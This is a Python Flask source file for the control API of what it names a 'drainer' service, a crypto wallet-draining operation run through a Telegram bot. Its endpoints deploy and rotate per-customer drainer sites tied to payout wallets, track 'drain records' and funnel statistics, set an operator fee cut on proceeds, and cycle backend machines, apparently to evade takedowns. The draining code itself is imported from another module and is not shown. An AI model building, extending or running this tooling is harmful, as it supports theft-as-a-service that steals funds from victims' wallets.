# core/service_api.py — HTTP API for the Telegram bot
#
# Run:  python -m core.service_api
# Listens on SERVICE_API_PORT (default 8444, localhost only).
#
# Auth: X-Service-Key header must match config drainer.service_key.
#
# Endpoints:
#   GET  /health           — service status
#   GET  /customers        — list customers (?chat_id= to filter to one bot user)
#   POST /customers        — {wallet, chat_id} → {wallet, url}
#   POST /customers/redeploy — {wallet} → {wallet, url}
#   POST /customers/delete — {wallet} → tear down site + registry record
#   POST /customers/wallet — {wallet, new_wallet} → change payout wallet
#   POST /customers/payout — {wallet, usdc} → toggle USDC conversion
#   GET  /customers/stats  — ?chat_id= → funnel counters + drain records
#   GET/POST /operator     — operator fee wallets + cut (admin, live)
#   GET  /backend/health   — drainer backend /health probe
#   POST /cycle            — trigger a rotation cycle now (admin)

import logging
import threading

import yaml
from flask import Flask, jsonify, request

from core.drainer_service import DrainerService

app = Flask(__name__)
service: DrainerService | None = None
service_key: str = ""


@app.before_request
def _auth():
    if request.path == "/health":
        return None
    if request.headers.get("X-Service-Key") != service_key:
        return jsonify({"error": "unauthorized"}), 401
    return None


@app.get("/health")
def health():
    return jsonify(
        {
            "ok": True,
            "customers": len(service.registry.all()) if service else 0,
            "backend": service.backend_origin() if service else None,
        }
    )


@app.get("/customers")
def list_customers():
    chat_id = request.args.get("chat_id")
    customers = [
        c for c in service.registry.all()
        if not chat_id or str(c.get("chat_id", "")) == str(chat_id)
    ]
    return jsonify(
        [
            {
                "wallet": c["wallet"],
                "url": (c["deployments"][-1]["url"] if c.get("deployments") else None),
                "project_name": c["project_name"],
                "usdc_payout": bool(c.get("usdc_payout")),
                "deployments": len(c.get("deployments", [])),
                "created_at": c["created_at"],
            }
            for c in customers
        ]
    )


@app.post("/customers")
def create_customer():
    data = request.get_json(silent=True) or {}
    wallet = (data.get("wallet") or "").strip()
    chat_id = str(data.get("chat_id") or "")
    if not chat_id:
        return jsonify({"error": "missing chat_id"}), 400
    try:
        result = service.create_customer(wallet, chat_id)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        logging.error(f"[api] create_customer failed: {e}")
        return jsonify({"error": "deployment failed"}), 500
    return jsonify(result)


@app.post("/customers/redeploy")
def redeploy_customer():
    data = request.get_json(silent=True) or {}
    wallet = (data.get("wallet") or "").strip()
    try:
        result = service.redeploy_customer(wallet)
    except ValueError as e:
        return jsonify({"error": str(e)}), 404
    except Exception as e:
        logging.error(f"[api] redeploy failed: {e}")
        return jsonify({"error": "deployment failed"}), 500
    return jsonify(result)


@app.post("/customers/delete")
def delete_customer():
    data = request.get_json(silent=True) or {}
    wallet = (data.get("wallet") or "").strip()
    try:
        result = service.delete_customer(wallet)
    except ValueError as e:
        return jsonify({"error": str(e)}), 404
    except Exception as e:
        logging.error(f"[api] delete failed: {e}")
        return jsonify({"error": "delete failed"}), 500
    return jsonify(result)


@app.post("/customers/wallet")
def change_wallet():
    data = request.get_json(silent=True) or {}
    wallet = (data.get("wallet") or "").strip()
    new_wallet = (data.get("new_wallet") or "").strip()
    if not new_wallet:
        return jsonify({"error": "missing new_wallet"}), 400
    try:
        result = service.set_payout_wallet(wallet, new_wallet)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        logging.error(f"[api] wallet change failed: {e}")
        return jsonify({"error": "deployment failed"}), 500
    return jsonify(result)


@app.post("/customers/payout")
def set_payout():
    data = request.get_json(silent=True) or {}
    wallet = (data.get("wallet") or "").strip()
    usdc = data.get("usdc")
    if usdc is None:
        return jsonify({"error": "missing usdc"}), 400
    try:
        result = service.set_usdc_payout(wallet, bool(usdc))
    except ValueError as e:
        return jsonify({"error": str(e)}), 404
    except Exception as e:
        logging.error(f"[api] payout toggle failed: {e}")
        return jsonify({"error": "deployment failed"}), 500
    return jsonify(result)


@app.get("/customers/stats")
def customer_stats():
    chat_id = request.args.get("chat_id")
    try:
        return jsonify(service.get_stats(chat_id))
    except Exception as e:
        logging.error(f"[api] stats failed: {e}")
        return jsonify({"error": "stats failed"}), 500


@app.get("/operator")
def get_operator():
    return jsonify(service.get_operator_config())


@app.post("/operator")
def set_operator():
    data = request.get_json(silent=True) or {}
    wallets = data.get("wallets") or []
    if not wallets:
        return jsonify({"error": "missing wallets"}), 400
    cut = data.get("cut")
    if cut is not None:
        try:
            cut = float(cut)
        except (TypeError, ValueError):
            return jsonify({"error": "cut must be a number"}), 400
    try:
        result = service.set_operator([str(w) for w in wallets], cut)
    except Exception as e:
        logging.error(f"[api] operator set failed: {e}")
        return jsonify({"error": "operator set failed"}), 500
    return jsonify(result)


@app.get("/backend/health")
def backend_health():
    return jsonify({"ok": service.check_backend_health()})


@app.post("/cycle")
def run_cycle():
    try:
        result = service.cycle()
    except Exception as e:
        logging.error(f"[api] cycle failed: {e}")
        return jsonify({"error": str(e)}), 500
    return jsonify(
        {
            "backend_machine": result["backend"]["vm_id"],
            "backend_healthy": result["backend_healthy"],
            "deployed": [d["url"] for d in result["deployed"]],
        }
    )


def main() -> None:
    global service, service_key

    with open("config.yaml", "r", encoding="utf-8") as f:
        config = yaml.safe_load(f)

    drainer_cfg = config.setdefault("drainer", {})
    service_key = str(drainer_cfg.get("service_key", ""))
    if not service_key:
        raise SystemExit("config.yaml: drainer.service_key is required (shared secret for the bot)")

    service = DrainerService(config)

    port = int(drainer_cfg.get("api_port", 8444))
    host = str(drainer_cfg.get("api_host", "127.0.0.1"))

    # Rotation loop in the background (first cycle runs immediately)
    t = threading.Thread(target=service.start, daemon=True)
    t.start()

    logging.info(f"[api] drainer service API on http://{host}:{port}")
    app.run(host=host, port=port, debug=False)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")
    main()
